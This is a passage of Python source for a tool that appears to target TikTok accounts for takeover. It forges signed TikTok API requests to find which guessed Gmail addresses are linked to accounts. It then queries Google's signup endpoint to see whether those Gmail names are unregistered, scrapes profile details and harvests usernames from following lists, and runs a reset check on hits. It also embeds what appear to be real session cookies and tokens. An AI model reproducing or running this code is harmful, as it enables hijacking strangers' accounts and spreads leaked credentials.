                params={'_rticket':rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
                user_agent = (
                    f"com.zhiliaoapp.musically/{randrange(2_000_000_000, 3_000_000_000)} "
                    f"(Linux; U; Android {randrange(10, 16)}; "
                    f"{choice(['ar_AE', 'en_US', 'fr_FR', 'es_ES'])}; "
                    f"{choice(['phone', 'tablet', 'tv'])}; "
                    f"Build/UP1A.{randrange(200_000_000, 300_000_000)}; "
                    f"Cronet/{randrange(10_000_000, 20_000_000)} {randrange(2023, 2026)}-"
                    f"{randrange(1,13):02}-{randrange(1,29):02}; "
                    f"QuicVersion:{randrange(10_000_000, 20_000_000)} {randrange(2023, 2026)}-"
                    f"{randrange(1,13):02}-{randrange(1,29):02})"
                )

                try:
                    m=sign(params=urlencode(params),payload="",cookie="")
                except Exception as e:
                    time.sleep(1)
                    continue

                headers = {
                    'User-Agent': user_agent,
                    'x-tt-passport-csrf-token':'deb4845f1062c1cf916902c6058604d1',
                    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                    'x-argus': m["x-argus"],
                    'x-gorgon': m["x-gorgon"],
                    'x-khronos': m["x-khronos"],
                    'x-ladon': m["x-ladon"]}
                try:
                    url="https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
                    res = requests.post(url, params=params, headers=headers,data={"email":email},cookies=cookies).text
                    if 'Email is linked to another account. Unlink or try another email.'in res:
                        return True
                    else:
                        return False
                except Exception as e:
                    time.sleep(1)
                    continue
            except Exception as e:
                time.sleep(1)
                continue

    def check_gmail(self,email):
        while True:
            try:
                if '@' in email:email=email.split('@')[0]
                o=self.gg00()['tokens']
                if not o:
                    time.sleep(1)
                    continue

                TL=o['TL']
                __Host_GAPS=o['__Host-GAPS']
                at=o['at']
                hl=o['hl']
                s1=o['s1']
                cookies = {
                    '__Host-GAPS': __Host_GAPS,
                }

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'priority': 'u=1, i',
                    'referer': 'https://accounts.google.com/',
                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
                    'sec-ch-ua-arch': '"x86"',
                    'sec-ch-ua-bitness': '"64"',
                    'sec-ch-ua-form-factors': '"Desktop"',
                    'sec-ch-ua-full-version': '"112.0.5197.39"',
                    'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"10.0.0"',
                    'sec-ch-ua-wow64': '?0',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
                    'x-same-domain': '1',
                }

                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'f.sid': '-794764349027196993',
                    'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
                    'hl': hl,
                    'TL': TL,
                    '_reqid': '648808',
                    'rt': 'c',
                }

                data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

                response = post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params,
                    cookies=cookies,
                    headers=headers,
                    data=data,
                ).text
                if 'password' in response:
                    return True
                else:
                    return False
            except Exception as e:
                time.sleep(1)
                continue

    def info(self,username):
        try:
            self.hits.append(username)
            inf=self.information(username)
            return inf
        except Exception as e:
            print(f"Error in info function for {username}: {e}")
            return {}

    def get_country_info(self, country_code):
        country_data = {
            "US": {"name": "United States", "flag": "🇺🇸"},
            "IQ": {"name": "Iraq", "flag": "🇮🇶"},
            "EG": {"name": "Egypt", "flag": "🇪🇬"},
        }
        info = country_data.get(country_code.upper(), {"name": "", "flag": ""})
        return info["name"], info["flag"]

    def information(self,username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
                }

            try:
                tikinfo = get(f'https://www.tiktok.com/@{username}', headers=headers).text
                info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
                name = str(info.split('nickname":"')[1]).split('",')[0] if 'nickname":"' in info else ""
                followers = str(info.split('followerCount":')[1]).split(',"')[0] if 'followerCount":' in info else ""
                following = str(info.split('followingCount":')[1]).split(',"')[0] if 'followingCount":' in info else ""
                like = str(info.split('heart":')[1]).split(',"')[0] if 'heart":' in info else ""
                video = str(info.split('videoCount":')[1]).split(',"')[0] if 'videoCount":' in info else ""
                id = str(info.split('id":"')[1]).split('",')[0] if 'id":"' in info else ""
                bio = str(info.split('signature":"')[1]).split('",')[0] if 'signature":"' in info else ""
                country = str(info.split('region":"')[1]).split('",')[0] if 'region":"' in info else ""
                private = str(info.split('privateAccount":')[1]).split(',"')[0] if 'privateAccount":' in info else ""
                
                country_name, flag = self.get_country_info(country)
                
                return {
                    "name": name,
                    "username": username,
                    "followers": followers,
                    "following": following,
                    "like": like,
                    "video": video,
                    "private": private,
                    "id": id,
                    "bio": bio,
                    "country_name": country_name,
                    "flag":flag,
                    "BY": "@DDDBB4"
                }
            except Exception as e:
                return {
                    "name": '',
                    "username": username,
                    "followers": '',
                    "following": '',
                    "like": '',
                    "video": '',
                    "private": '',
                    "id": '',
                    "bio": '',
                    "country_name": "",
                    "flag":"",
                    "BY": "@DDDBB4"
                }
        except Exception as e:
            return {
                  "name": '',
                  "username": username,
                  "followers": '',
                  "following": '',
                  "like": '',
                  "video": '',
                  "private": '',
                  "id": '',
                  "bio": '',
                  "country_name": "",
                  "flag":"",
                  "BY": "@DDDBB4"
              }

    def get_following(self,username,id):
        while True:
            try:
                usernames=[]
                uid = "".join(choice('1234567890')for i in range(18))
                url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&sec_user_id={username}=1694591114&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694591805386&app_language=ar&current_region=IQ&app_type=normal&iid=7278211504247604997&channel=googleplay&device_type=Infinix%20X692&language=ar&locale=ar&resolution=720*1464&openudid=b32f27a32b0e1880&update_version_code=2019081160&sys_region=EG&os_api=29&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7149927891131893254&pass-route=1&mcc_mnc=41820&os_version=10&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=Infinix&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694591805'
                he = {
                    'Host': 'api2-19-h2.musical.ly', 'Connection': 'keep-alive',
                    'Cookie': 'passport_csrf_token_default=621d779700f3a5e1c16e847f556de1cf; odin_tt=866be507765a947edcd21b15da40c33f3ec663cb56a5b8f17c4cbc59501c8cdc11443e8b5f7613a3e1eeeaf9c5c5c626ba9d9371661dafbd1715044506eea452becf1c641da7911b51d360267627beb1; d_ticket=b74d11501bf12e69ef3a14403dd9b53a6e0ef; sid_guard=75cd6d4793949f0c1fbffbbf214bd8f3%7C1694590737%7C15552000%7CMon%2C+11-Mar-2024+07%3A38%3A57+GMT; uid_tt=f24ebc81f26b3bbb139120e2a1fd84079edcdd9f0ef437207295174d90d81ac2; sid_tt=75cd6d4793949f0c1fbffbbf214bd8f3; sessionid=75cd6d4793949f0c1fbffbbf214bd8f3; store-idc=maliva; store-country-code=iq; store-country-code-src=uid ', 'Accept-Encoding': 'gzip ', 'X-Tt-Token': '0375cd6d4793949f0c1fbffbbf214bd8f30164a11d6f25e25bbf64cd4eeb57d19e038d0cba33388bc9e6366339c6766e38542b539e748b10032429083916186c8e084307f982d3168df208b7c810609e2e556ddd14c2cada22858b2255f9b065579de-CkA3YmIxYTA0NmYzYWI4NTFiOGI1ZThmYjMzYTk3ODMxOTVkMTU1NWVmMjY5NDQ5Yzk2OGEyZWQ2YzBlYWI0MWQx-2.0.0',
                    'sdk-version': '1',
                    'x-tt-trace-id': '00-cb0d0c7cf24f0f1ba8d51e896bf5ac43-cb0d0c7cf24f0f1b-01',
                    'User-Agent': 'com.zhiliaoapp.musically/2019081160 (Linux; U; Android 10; ar_EG; Infinix X692; Build/QP1A.190711.020; Cronet/58.0.2991.0)',
                    'X-Khronos': '1694591805',
                    'XGorgon':'83005ff000008e4a029840116a6f3d461d9c1aaef0c6f5e6c2ed'}
                re = get(url,headers=he).json()['followings']
                for user in re:
                        username=(user['unique_id'])
                        follower_count=int(user['follower_count'])
                        if '_' not in username:
                                usernames.append(username)
                return usernames
            except Exception as e:
                return []

    def home(self,username):
        try:
            email=username+'@gmail.com'
            linked_tiktok = self.check_linked(email)
            
            with self.update_lock:
                if linked_tiktok:
                    self.good_tiktok+=1
                else:
                    self.bad_tiktok+=1

                self.update_display()

            if linked_tiktok:
                gmail_exists = self.check_gmail(username)
                
                with self.update_lock:
                    if gmail_exists:
                        self.good_gmail+=1
                    else:
                        self.bad_gmail+=1
                    self.update_display()
                
                if gmail_exists:
                    print(f"\n{Colors.BRIGHT_GREEN}Found good_gmail: {username}. Running TikTok rest check...{Colors.RESET}")
                    time.sleep(4) 
                    tiktok_rest_checker = TikTok(username, self.id, self.token)
                    tiktok_rest_checker.check_rest()
            
        except Exception as e:
            print(f"{Colors.BRIGHT_RED}Error in home function for {username}: {e}{Colors.RESET}")

    def update_display(self):
        sys.stdout.write(
            f'''\r{Colors.CYAN}╔═════════════════════════════════════╗\n'''
            f'''{Colors.CYAN}║ {Colors.BRIGHT_GREEN}Good Gmail: {self.good_gmail:<5} {Colors.BRIGHT_RED}Bad TikTok: {self.bad_tiktok:<5}{Colors.CYAN} ║\n'''
            f'''{Colors.CYAN}║ {Colors.BRIGHT_RED}Bad Gmail:  {self.bad_gmail:<5} {Colors.BRIGHT_GREEN}Good TikTok: {self.good_tiktok:<5}{Colors.CYAN}║\n'''
            f'''{Colors.CYAN}╚═════════════════════════════════════╝{Colors.RESET}'''
        )
        sys.stdout.flush()

if __name__ == "__main__":
    checker = TikTokChecker()
